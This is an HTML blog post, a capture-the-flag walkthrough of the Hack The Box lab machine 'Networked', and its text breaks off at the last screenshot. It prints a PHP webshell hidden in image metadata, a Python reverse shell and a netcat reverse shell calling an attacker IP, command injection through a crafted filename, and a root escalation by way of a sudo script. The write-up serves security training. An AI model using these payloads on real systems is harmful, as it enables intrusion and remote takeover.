@@ -1,0 +1,514 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Networked - Hack The Box</title>
+  <meta name="description" content="Resolution of the Networked machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Networked - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/networked">
+  <meta property="og:description" content="Resolution of the Networked machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/networked">
+  <meta name="twitter:title" content="Networked - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Networked machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/networked/networked-00-171968baee87a7558221a40010b3ae3cae949e8bcb839ae929326156f1e3a2f1.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/networked/networked-00-171968baee87a7558221a40010b3ae3cae949e8bcb839ae929326156f1e3a2f1.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Networked - Hack The Box</h1>
+            <p>Resolution of the Networked machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    June 23, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      7 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/networked/networked-00-171968baee87a7558221a40010b3ae3cae949e8bcb839ae929326156f1e3a2f1.png">
+  <img src="/assets/hackthebox/networked/networked-00-171968baee87a7558221a40010b3ae3cae949e8bcb839ae929326156f1e3a2f1.png" alt="Networked banner" class="zooming" data-rjs="/assets/hackthebox/networked/networked-00-171968baee87a7558221a40010b3ae3cae949e8bcb839ae929326156f1e3a2f1.png" data-zooming-width="596" data-zooming-height="378">
+</a></p>
+
+<p>Networked is an easy level machine based on Linux, the initial approach is based on a file upload inside a web application.
+The privilege escalation process requires basic knowledge about PHP and Bash scripts in order to bypass some restrictions and inject system commands.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Starting with Nmap:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.70 scan initiated Sat Feb  1 10:07:20 2020 as: nmap -sC -sV -oA networked -T4 -p- 10.10.10.146</span>
+Nmap scan report <span class="k">for </span>10.10.10.146
+Host is up <span class="o">(</span>0.13s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 filtered ports
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open   http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
+|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
+|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>
+443/tcp closed https
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sat Feb  1 10:11:02 2020 -- 1 IP address (1 host up) scanned in 221.98 seconds</span></code></pre></figure>
+
+<p>The web application at port 80 has a simple text about their products:</p>
+
+<p><a href="/assets/hackthebox/networked/networked-01-83d2ed8a9289a1fb7b1935a1f1d33b56584b0adae7d97f1f228930cf5f165626.png">
+  <img src="/assets/hackthebox/networked/networked-01-83d2ed8a9289a1fb7b1935a1f1d33b56584b0adae7d97f1f228930cf5f165626.png" alt="Networked Recon" class="zooming" data-rjs="/assets/hackthebox/networked/networked-01-83d2ed8a9289a1fb7b1935a1f1d33b56584b0adae7d97f1f228930cf5f165626.png" data-zooming-width="957" data-zooming-height="150">
+</a></p>
+
+<p>Enumerating the web application in search of directories and files using the gobuster tool we got the following results:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://10.10.10.146 <span class="nt">-t</span> 25
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.146
+<span class="o">[</span>+] Threads:        25
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/02/01 21:15:55 Starting gobuster
+<span class="o">===============================================================</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/backup <span class="o">(</span>Status: 301<span class="o">)</span>
+/cgi-bin/ <span class="o">(</span>Status: 403<span class="o">)</span>
+/uploads <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/02/01 21:18:07 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>The <code class="highlighter-rouge">backup</code> directory has a file named <code class="highlighter-rouge">backup.tar</code>:</p>
+
+<p><a href="/assets/hackthebox/networked/networked-02-078fad99b0dff536b1aa3327f1c279d9e343b0c80f4b88f469c161bf5b6ba290.png">
+  <img src="/assets/hackthebox/networked/networked-02-078fad99b0dff536b1aa3327f1c279d9e343b0c80f4b88f469c161bf5b6ba290.png" alt="Networked Recon" class="zooming" data-rjs="/assets/hackthebox/networked/networked-02-078fad99b0dff536b1aa3327f1c279d9e343b0c80f4b88f469c161bf5b6ba290.png" data-zooming-width="589" data-zooming-height="235">
+</a></p>
+
+<p>After downloading the .tar file we found that the contents appears to be the source code of the web application:</p>
+
+<p><a href="/assets/hackthebox/networked/networked-03-45ed228c1ebc4bb68b68a46edc98137fe5236860268892e02434811472208d22.png">
+  <img src="/assets/hackthebox/networked/networked-03-45ed228c1ebc4bb68b68a46edc98137fe5236860268892e02434811472208d22.png" alt="Networked Recon" class="zooming" data-rjs="/assets/hackthebox/networked/networked-03-45ed228c1ebc4bb68b68a46edc98137fe5236860268892e02434811472208d22.png" data-zooming-width="804" data-zooming-height="371">
+</a></p>
+
+<p>The <code class="highlighter-rouge">upload.php</code> file is interesting:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">require</span> <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>
+
+<span class="nb">define</span><span class="p">(</span><span class="s2">"UPLOAD_DIR"</span><span class="p">,</span> <span class="s2">"/var/www/html/uploads/"</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$myFile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">];</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">check_file_type</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'myFile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">60000</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s1">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span><span class="p">;</span>
+      <span class="nx">displayform</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">UPLOAD_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"&lt;p&gt;An error occurred.&lt;/p&gt;"</span><span class="p">;</span>
+        <span class="nx">displayform</span><span class="p">();</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];</span>
+    <span class="k">list</span> <span class="p">(</span><span class="nv">$foo</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nx">getnameUpload</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]);</span>
+    <span class="nv">$validext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'.jpg'</span><span class="p">,</span> <span class="s1">'.png'</span><span class="p">,</span> <span class="s1">'.gif'</span><span class="p">,</span> <span class="s1">'.jpeg'</span><span class="p">);</span>
+    <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$validext</span> <span class="k">as</span> <span class="nv">$vext</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nb">substr_compare</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">],</span> <span class="nv">$vext</span><span class="p">,</span> <span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$vext</span><span class="p">))</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$valid</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s2">"&lt;p&gt;Invalid image file&lt;/p&gt;"</span><span class="p">;</span>
+      <span class="nx">displayform</span><span class="p">();</span>
+      <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="s1">'_'</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">])</span><span class="o">.</span><span class="s1">'.'</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
+
+    <span class="nv">$success</span> <span class="o">=</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nx">UPLOAD_DIR</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$success</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"&lt;p&gt;Unable to save file.&lt;/p&gt;"</span><span class="p">;</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">echo</span> <span class="s2">"&lt;p&gt;file uploaded, refresh gallery&lt;/p&gt;"</span><span class="p">;</span>
+
+    <span class="c1">// set proper permissions on the new file</span>
+    <span class="nb">chmod</span><span class="p">(</span><span class="nx">UPLOAD_DIR</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+  <span class="nx">displayform</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p><a href="/assets/hackthebox/networked/networked-04-64ded3d936154229a66e4c8f6fa2b8059ce88a29b6eeae062ff70eae1fd70c89.png">
+  <img src="/assets/hackthebox/networked/networked-04-64ded3d936154229a66e4c8f6fa2b8059ce88a29b6eeae062ff70eae1fd70c89.png" alt="Networked Recon" class="zooming" data-rjs="/assets/hackthebox/networked/networked-04-64ded3d936154229a66e4c8f6fa2b8059ce88a29b6eeae062ff70eae1fd70c89.png" data-zooming-width="532" data-zooming-height="110">
+</a></p>
+
+<h1 id="exploiting---injecting-php-commands-into-an-image">Exploiting - Injecting PHP commands into an image</h1>
+
+<p>After a couple tries trying to upload a PHP web shell we’re able to upload a webshell injecting a PHP command into image metadata using the tool named <code class="highlighter-rouge">exiftool</code>:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">exiftool <span class="nt">-Comment</span><span class="o">=</span><span class="s1">'&lt;?=`$_GET[0]`?&gt;'</span> shell.php.jpeg</code></pre></figure>
+
+<p><a href="/assets/hackthebox/networked/networked-05-dbab08080d5e29d4ac75a52385d67c96107a6262515823a91a5990ab5e5ad7fb.png">
+  <img src="/assets/hackthebox/networked/networked-05-dbab08080d5e29d4ac75a52385d67c96107a6262515823a91a5990ab5e5ad7fb.png" alt="Networked Exploiting" class="zooming" data-rjs="/assets/hackthebox/networked/networked-05-dbab08080d5e29d4ac75a52385d67c96107a6262515823a91a5990ab5e5ad7fb.png" data-zooming-width="932" data-zooming-height="159">
+</a></p>
+
+<p>Accessing <code class="highlighter-rouge">photos.php</code> we noticed that our malicious image has been uploaded without a thumbnail:</p>
+
+<p><a href="/assets/hackthebox/networked/networked-06-5331baa6c5ea0ff137e2bd73e0a3c8687d49d505e8c255c3814c146e80978315.png">
+  <img src="/assets/hackthebox/networked/networked-06-5331baa6c5ea0ff137e2bd73e0a3c8687d49d505e8c255c3814c146e80978315.png" alt="Networked Exploiting" class="zooming" data-rjs="/assets/hackthebox/networked/networked-06-5331baa6c5ea0ff137e2bd73e0a3c8687d49d505e8c255c3814c146e80978315.png" data-zooming-width="1217" data-zooming-height="351">
+</a></p>
+
+<p>Now we’re able to execute system commands with success!</p>
+
+<p><a href="/assets/hackthebox/networked/networked-07-379372c36942ad63850cbacd7cf54961555330cfaad64ce55b8a66ee9e680e00.png">
+  <img src="/assets/hackthebox/networked/networked-07-379372c36942ad63850cbacd7cf54961555330cfaad64ce55b8a66ee9e680e00.png" alt="Networked Exploiting" class="zooming" data-rjs="/assets/hackthebox/networked/networked-07-379372c36942ad63850cbacd7cf54961555330cfaad64ce55b8a66ee9e680e00.png" data-zooming-width="959" data-zooming-height="236">
+</a></p>
+
+<p>After that we need to set up our reverse shell and the netcat on listening mode.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.22",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre></figure>
+
+<p><a href="/assets/hackthebox/networked/networked-08-de636609526d166b016039481b52747031834d28c3d6d4ff182586ea51dc7353.png">
+  <img src="/assets/hackthebox/networked/networked-08-de636609526d166b016039481b52747031834d28c3d6d4ff182586ea51dc7353.png" alt="Networked Exploiting" class="zooming" data-rjs="/assets/hackthebox/networked/networked-08-de636609526d166b016039481b52747031834d28c3d6d4ff182586ea51dc7353.png" data-zooming-width="437" data-zooming-height="138">
+</a></p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that generate an image, inject the PHP, upload the malicious image and spawn an interactive reverse shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/networked" target="_blank">Networked Exploit</a></p>
+
+<p><a href="/assets/hackthebox/networked/networked-09-6f17823a35116b872501f2e09ce519a2b0fcc42275f500efae880c64f6c1348d.png">
+  <img src="/assets/hackthebox/networked/networked-09-6f17823a35116b872501f2e09ce519a2b0fcc42275f500efae880c64f6c1348d.png" alt="Networked Exploit" class="zooming" data-rjs="/assets/hackthebox/networked/networked-09-6f17823a35116b872501f2e09ce519a2b0fcc42275f500efae880c64f6c1348d.png" data-zooming-width="677" data-zooming-height="234">
+</a></p>
+
+<h1 id="post-exploitation---doing-code-review-and-changing-script-behaviors">Post Exploitation - Doing code review and changing script behaviors</h1>
+
+<p>After a quick enumeration we found an interesting file named <code class="highlighter-rouge">check_attack.php</code> under the user <code class="highlighter-rouge">guly</code>’s home with the following content:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">require</span> <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>
+<span class="nv">$path</span> <span class="o">=</span> <span class="s1">'/var/www/html/uploads/'</span><span class="p">;</span>
+<span class="nv">$logpath</span> <span class="o">=</span> <span class="s1">'/tmp/attack.log'</span><span class="p">;</span>
+<span class="nv">$to</span> <span class="o">=</span> <span class="s1">'guly'</span><span class="p">;</span>
+<span class="nv">$msg</span><span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$headers</span> <span class="o">=</span> <span class="s2">"X-Mailer: check_attack.php</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nv">$files</span> <span class="o">=</span> <span class="nb">preg_grep</span><span class="p">(</span><span class="s1">'/^([^.])/'</span><span class="p">,</span> <span class="nb">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>
+
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$msg</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="s1">'index.html'</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">continue</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="c1">#echo "-------------\n";</span>
+
+  <span class="c1">#print "check: $value\n";</span>
+  <span class="k">list</span> <span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nx">getnameCheck</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+  <span class="nv">$check</span> <span class="o">=</span> <span class="nx">check_ip</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$check</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"attack!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="c1"># todo: attach file</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logpath</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nx">FILE_APPEND</span> <span class="o">|</span> <span class="nx">LOCK_EX</span><span class="p">);</span>
+
+    <span class="nb">exec</span><span class="p">(</span><span class="s2">"rm -f </span><span class="nv">$logpath</span><span class="s2">"</span><span class="p">);</span>
+    <span class="nb">exec</span><span class="p">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">"rm -f </span><span class="nv">$path$value</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">,</span> <span class="s2">"-F</span><span class="nv">$value</span><span class="s2">"</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>This file has the following permissions:</p>
+
+<blockquote>
+  <p>-r–r–r–. 1 root root 782 Oct 30 2018 check_attack.php</p>
+</blockquote>
+
+<p>Doing basic code review we noticed that the purpose of this file is to be executed as a small firewall. The script deals with some logs and checks to indentify any potential attacker that doesn’t follow valid IP formats when creating files under <code class="highlighter-rouge">/var/www/html/uploads</code>. There’s a critical vulnerable point: <code class="highlighter-rouge">exec</code> on line 29 because the user input is stored into <code class="highlighter-rouge">$path$value</code> where the <code class="highlighter-rouge">$value</code> is the name of the file created under <code class="highlighter-rouge">/var/www/html/uploads</code> directory.
+This leads to a vulnerability named <code class="highlighter-rouge">command injection</code> because the attacker is able create a file and append a command on its name.</p>
+
+<p>To exploit this vulnerability let’s create a file inside <code class="highlighter-rouge">/var/www/html/uploads</code> directory with named <code class="highlighter-rouge">;nc -e \$(which bash) 10.10.14.22 4444</code>:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">touch</span> <span class="s2">";nc -e </span><span class="se">\$</span><span class="s2">(which bash) 10.10.14.22 4444"</span></code></pre></figure>
+
+<p>After some time we got a reverse shell connection as <code class="highlighter-rouge">guly</code> user:</p>
+
+<p><a href="/assets/hackthebox/networked/networked-10-aeb3349ea3bbd5418b46f37b6d6a09860309ad0f0e9a869bc918a78f8a9410c8.png">
+  <img src="/assets/hackthebox/networked/networked-10-aeb3349ea3bbd5418b46f37b6d6a09860309ad0f0e9a869bc918a78f8a9410c8.png" alt="Networked Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/networked/networked-10-aeb3349ea3bbd5418b46f37b6d6a09860309ad0f0e9a869bc918a78f8a9410c8.png" data-zooming-width="432" data-zooming-height="114">
+</a></p>
+
+<p>After that we need to enumerate again in order to escalate our privileges to root. The <code class="highlighter-rouge">sudo -l</code> command reveals an interesting script located at <code class="highlighter-rouge">/usr/local/sbin/changename.sh</code>.
+The changename.sh script has root privileges and the following content:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="o">!</span>/bin/bash <span class="nt">-p</span>
+<span class="nb">cat</span> <span class="o">&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly <span class="o">&lt;&lt;</span> <span class="no">EoF</span><span class="sh">
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+</span><span class="no">EoF
+
+</span><span class="nv">regexp</span><span class="o">=</span><span class="s2">"^[a-zA-Z0-9_</span><span class="se">\ </span><span class="s2">/-]+$"</span>
+
+<span class="k">for </span>var <span class="k">in </span>NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class="p">;</span> <span class="k">do
+	</span><span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
+	<span class="nb">read </span>x
+	<span class="k">while</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$x</span> <span class="o">=</span>~ <span class="nv">$regexp</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do
+		</span><span class="nb">echo</span> <span class="s2">"wrong input, try again"</span>
+		<span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
+		<span class="nb">read </span>x
+	<span class="k">done
+	</span><span class="nb">echo</span> <span class="nv">$var</span><span class="o">=</span><span class="nv">$x</span> <span class="o">&gt;&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly
+<span class="k">done</span>
+  
+/sbin/ifup guly0</code></pre></figure>
+
+<p>The script needs 4 inputs to be executed:</p>
+
+<ul>
+  <li>NAME</li>
+  <li>PROXY_METHOD</li>
+  <li>BROWSER_ONLY</li>
+  <li>BOOTPROTO</li>
+</ul>
+
+<p>By inserting <code class="highlighter-rouge">/bin/bash</code> on <code class="highlighter-rouge">NAME</code> input we’re able to spawn a shell as root user!</p>
+
+<p><a href="/assets/hackthebox/networked/networked-11-81c67eb8b31320a0c933de237a0f096a35ddacfa2beda5ee21408d387294c615.png">
